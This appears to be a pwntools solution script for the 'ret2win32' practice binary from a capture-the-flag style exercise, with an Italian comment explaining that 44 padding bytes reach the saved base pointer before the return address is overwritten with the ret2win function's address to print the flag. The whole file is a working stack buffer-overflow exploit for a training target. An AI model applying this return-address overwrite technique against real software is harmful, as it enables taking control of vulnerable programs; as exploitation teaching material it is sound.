from pwn import *

elf = ELF("./ret2win32")

p = process("./ret2win32")
p.recvline()

"""
Qui abbiamo la funzione ret2win che, se chiamata, stampa direttamente la flag. Basta sovrascrivere il return pointer con 
l'indirizzo di ret2win e il gioco Ã¨ fatto. Aggiungiamo quindi 44 byte casuali per arrivare fino al base pointer e poi
sovrascriviamo il return pointer con l'indirizzo.
"""

payload = b''
payload += p32(elf.symbols['ret2win'])


p.send(cyclic(44) + payload)
					   

p.interactive()
